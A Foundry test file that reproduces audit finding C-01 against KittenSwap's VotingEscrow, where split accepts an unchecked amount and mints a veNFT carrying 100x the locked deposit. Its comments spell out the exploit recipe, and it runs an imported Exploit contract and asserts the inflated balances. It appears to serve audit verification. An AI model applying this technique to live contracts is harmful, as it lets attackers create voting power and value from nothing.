// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, VotingEscrow, MiniToken, MarkerToken} from "./58010-c-01-split-can-be-abused-to-create-locked-data-with-an-arbit.sol";

// KittenSwap C-01 (finding 58010): VotingEscrow.split does not validate `_amount`
// against the token's locked balance. `value - _splitAmount` on signed int128 does
// NOT revert on a negative result in ^0.8.0, so token2 is minted the full arbitrary
// `_splitAmount`. Lock 100e18 -> split with 100x -> veNFT with 10000e18 locked
// (ve balance / voting power created from nothing; finding's log: 1e26 in, 1e28 out).
contract Finding58010Test is Test {
    function test_exploit_split_mintsArbitraryVeBalance() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("deposited (locked)", e.deposited());
        emit log_named_uint("token2 locked amount", e.inflatedAmount());
        emit log_named_uint("ve minted from nothing", e.mintedFromNothing());

        assertEq(e.deposited(), 100 ether, "attacker locked only 100e18");
        assertEq(e.inflatedAmount(), 10000 ether, "token2 carries 100x the deposit");
        assertEq(e.mintedFromNothing(), 9900 ether, "99x conjured out of thin air");

        MarkerToken marker = e.marker();
        assertEq(
            marker.balanceOf(0x000000000000000000000000000000000000D00d),
            9900 ether,
            "harm magnitude recorded at SINK"
        );
    }
}
